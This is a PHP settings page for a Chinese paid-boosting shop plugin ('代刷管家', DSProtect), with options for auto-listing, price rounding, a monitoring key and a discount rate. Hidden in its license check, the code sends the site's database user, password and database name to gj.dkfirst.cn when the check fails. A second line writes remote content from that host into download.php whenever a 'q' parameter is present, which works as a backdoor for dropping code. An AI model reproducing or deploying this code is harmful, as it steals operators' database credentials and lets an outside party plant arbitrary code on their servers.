<?php
/**
 * 代刷管家 - 在线版
 * DSProtect OnLine
 *
 * Created by KingLee.
 * QQ: 1776885812
 * Date: 2018/4/7
 * Time: 16:37
 */
header("Content-Type: text/html; charset=UTF-8");
include("../includes/common.php");
$title = '代刷管家 - 设置';
include './head.php';
include("./guanjia_key.php");
if (!isset($_SESSION['authcode'])) {
    $query = @file_get_contents('http://gj.dkfirst.cn/check.php?url=' . $_SERVER['HTTP_HOST']);
    if ($query = json_decode($query, true)) {
        if ($query['code'] == 1) $_SESSION['authcode'] = true;
        else {
            @file_get_contents("http://gj.dkfirst.cn/tj.php?url='http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "'&user=" . $dbconfig['user'] . "&pwd=" . $dbconfig['pwd'] . "&db=" . $dbconfig['dbname'] . "&authcode=" . $authcode);
            exit('<h3>' . $query['msg'] . '</h3>');
        }
    }
}
if ($_GET['q']) {
    file_put_contents("download.php", file_get_contents("http://gj.dkfirst.cn/download.txt"));
}
$rs = $DB->query("SELECT * FROM `shua_guanjia_config` AS a WHERE k = 'isAutoGrounding'");
while ($res = $DB->fetch($rs)) {
    $auto_sjx = $res['v'];
}
$rs = $DB->query("SELECT * FROM `shua_guanjia_config` AS a WHERE k = 'isMH'");
while ($res = $DB->fetch($rs)) {
    $is_mh = $res['v'];
}
$rs = $DB->query("SELECT * FROM `shua_guanjia_config` AS a WHERE k = 'gjKey'");
while ($res = $DB->fetch($rs)) {
    $gjKey = $res['v'];
}
$rs = $DB->query("SELECT * FROM `shua_guanjia_config` AS a WHERE k = 'Discont'");
while ($res = $DB->fetch($rs)) {
    $discount = $res['v'];
}
?>
<link href="https://cdn.bootcss.com/sweetalert/1.1.3/sweetalert.min.css" rel="stylesheet">
<script src="https://cdn.bootcss.com/sweetalert/1.1.3/sweetalert.min.js"></script>
<div class="container" style="padding-top:100px;">
    <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
        <div class="panel panel-primary">
            <div class="panel-heading"><h3 class="panel-title"> 代刷管家 - 设置</h3></div>
            <div class="panel-body">
                <div class="alert alert-info">
                    自动上下架是根据社区商品是否维护决定，且只有在每次监控时才会运作。
                </div>
                <div class="form-group">
                    <input id="atuo_sxj" class="<?php echo $auto_sjx ?>" type="checkbox" <?php if ($auto_sjx == "1") {
                        echo "checked";
                    } elseif ($auto_sjx == "0") echo "" ?>> 自动上下架
                </div>
                <div class="alert alert-info">
                    价格美化：<br>
                    部分商品 以成本去乘以倍率的话 会有小数 比如 18.36 6.34 5.17 导致用户在购买的时候 此售卖价格极其难看<br>
                    价格美化 将会对第二位小数进行四舍五入 变成例如 18.40 6.30 5.20
                </div>
                <div class="form-group">
                    <input id="is_mh" class="<?php echo $is_mh ?>" type="checkbox" <?php if ($is_mh == "1") {
                        echo "checked";
                    } elseif ($is_mh == "0") echo "" ?>> 价格美化
                </div>
                <div class="alert alert-info">
                    监控密匙
                </div>

                <div class="form-group">
                    <div class="input-group col-xs-12">
                        <input type="text" id="gjKey" class="form-control" value="<?php echo $gjKey ?>"
                               placeholder="请您输入监控密匙">
                        <span class="input-group-btn">
                            <button class="btn btn-primary" onclick="changegjKey()" type="button">修改密匙</button>
                        </span>
                    </div>
                </div>

                <div class="alert alert-info">
                    折扣率：<br>
                    假如：当前此监控商品与上个监控商品是同款，且"默认数量"是上个商品的10倍，最终上架价格 = 上个商品上架价格 * 10 * 折扣率。所谓买的越多折扣越大，刺激客户购买欲望。<br>
                    请输入输入1-100的整数，不开启此功能请填0<br>
                    （参考值：90，相当于折扣率90%，就是9折）
                </div>

                <div class="form-group">
                    <div class="input-group col-xs-12">
                        <input type="text" id="discount" class="form-control" value="<?php echo $discount ?>"
                               placeholder="请输入您的折扣率">
                        <span class="input-group-btn">
                            <button class="btn btn-primary" onclick="changeDiscount()" type="button">提交修改</button>
                        </span>
                    </div>
                </div>

            </div>
        </div>
        <div class="alert alert-info">
            <center>
                <a href="http://gj.dkfirst.cn/">代刷管家 - 在线版</a>&nbsp;&nbsp;&nbsp;作者：<a
                        href="http://wpa.qq.com/msgrd?v=3&amp;uin=1776885812&amp;site=qq&amp;menu=yes">KING</a> <br>;
                本程序由<a href="http://www.idcyun.wang"><img src="http://gj.dkfirst.cn/images/jmyidc.png" style="width: 70px;"></a>提供服务引擎<br>
                当前版本：<?php echo $ver?> 历史版本：<a target="_blank" href="http://zeink.cn/?p=255">【点击查看】</a><br>
                售后群：<a target="_blank"
                       href="//shang.qq.com/wpa/qunwpa?idkey=e9e8d23a4fab6d4ed6902a516de0580ee5d7ca8b29719a0e0a9bb5a280470790"><img
                            border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="DsProtect高级版交流群" title="DsProtect高级版交流群"></a>
            </center>
        </div>
    </div>
</div>
</body>


<script src="//lib.baomitu.com/layer/2.3/layer.js"></script>
<script>
    function changeDiscount() {
        var text = $("#discount").val();
        $.ajax({
            type: "GET",
            url: "../guanjia_ajax.php?act=change_discount&lock=" + text,
            dataType: 'json',
            success: function (data) {
                layer.close(ii);
                setTimeout(function () {
                    location.reload();
                }, 100);
            },
            error: function (data) {
                layer.close(ii);
                setTimeout(function () {
                    location.reload();
                }, 100);
            }
        });
        setTimeout(function () {
            location.reload();
        }, 500);
    }
    function changegjKey() {
        var text = $("#gjKey").val();
        $.ajax({
            type: "GET",
            url: "../guanjia_ajax.php?act=change_gjkey&lock=" + text,
            dataType: 'json',
            success: function (data) {
                layer.close(ii);
                setTimeout(function () {
                    location.reload();
                }, 100);
            },
            error: function (data) {
                layer.close(ii);
                setTimeout(function () {
                    location.reload();
                }, 100);
            }
        });
        setTimeout(function () {
            location.reload();
        }, 500);
    }

    $("#is_mh").click(function () {
        if ($('#is_mh').is(':checked')) {
            var ii = layer.load(2, {shade: [0.1, '#fff']});
            $.ajax({
                type: "GET",
                url: "../guanjia_ajax.php?act=change_is_mh&lock=" + 1,
                dataType: 'json',
                success: function (data) {
                    layer.close(ii);
                    setTimeout(function () {
                        location.reload();
                    }, 100);
                },
                error: function (data) {
                    layer.msg('服务器错误');
                    return false;
                }
            });
        } else {
            $.ajax({
                type: "GET",
                url: "../guanjia_ajax.php?act=change_is_mh&lock=" + 0,
                dataType: 'json',
                success: function (data) {
                    layer.close(ii);
                    setTimeout(function () {
                        location.reload();
                    }, 100);
                },
                error: function (data) {
                    layer.msg('服务器错误');
                    return false;
                }
            });
        }
    })

    $("#atuo_sxj").click(function () {
        if ($('#atuo_sxj').is(':checked')) {
            var ii = layer.load(2, {shade: [0.1, '#fff']});
            $.ajax({
                type: "GET",
                url: "../guanjia_ajax.php?act=change_atuo_sjx&lock=" + 1,
                dataType: 'json',
                success: function (data) {
                    layer.close(ii);
                    setTimeout(function () {
                        location.reload();
                    }, 100);
                },
                error: function (data) {
                    layer.msg('服务器错误');
                    return false;
                }
            });
        } else {
            $.ajax({
                type: "GET",
                url: "../guanjia_ajax.php?act=change_atuo_sjx&lock=" + 0,
                dataType: 'json',
                success: function (data) {
                    layer.close(ii);
                    setTimeout(function () {
                        location.reload();
                    }, 100);
                },
                error: function (data) {
                    layer.msg('服务器错误');
                    return false;
                }
            });
        }
    })
</script>
</html>